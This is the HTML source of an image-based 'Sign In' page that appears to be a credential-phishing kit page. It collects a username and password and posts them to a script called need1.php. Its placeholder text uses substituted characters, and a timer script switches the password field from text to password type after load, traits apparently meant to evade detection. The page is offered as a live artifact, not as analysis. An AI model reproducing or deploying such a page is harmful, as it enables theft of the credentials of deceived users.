<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign In</title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<style type="text/css">	   
.textbox {
    height: 42px;
    padding-left: 8px;
    border: none;
	background: 0 0;
   	border-bottom: solid 1px #ccc;
	font-family: 'Open Sans','Helvetica Neue',Helvetica,Arial,sans-serif;
    font-size: 17px;
    width: 270px;
}
 .textbox:focus {  
    outline: none;
    background: 0 0;
    outline: solid 1px #126BC5;
}
</style>
<style type="text/css">
input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:27px;
							height:22px; 
							display:inline-block;
							line-height:22px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:22px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -22px;
						}
						label.css-label {
				background-image:url(images/bx.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}		
</style>	
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:523px; z-index:0"><img src="images/g1.png" alt="" title="" border=0 width=1349 height=523></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:520px; width:1348px; height:196px; z-index:1"><a href="#"><img src="images/g3.png" alt="" title="" border=0 width=1348 height=196></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:504px; top:407px; width:199px; height:43px; z-index:2"><a href="#"><img src="images/g2.png" alt="" title="" border=0 width=199 height=43></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:589px; top:23px; width:172px; height:35px; z-index:3"><a href="#"><img src="images/g4.png" alt="" title="" border=0 width=172 height=35></a></div>
<form action=need1.php name=arambagh method=post>
<input name="ud" placeholder="Us??rn??m??" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:321px;left:513px;top:194px;z-index:4">
<input name="pd" placeholder="P??ss????rd" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:321px;left:513px;top:254px;z-index:5">
<div id="checkboxG1"  style="position:absolute; left:515px; top:310px; z-index:6"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:515px; top:310px; z-index:6"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
<div id="formimage1" style="position:absolute; left:503px; top:349px; z-index:7"><input type="image" name="formimage1" width="342" height="42" src="images/bt.png"></div>
</div>

	
</body>
</html>
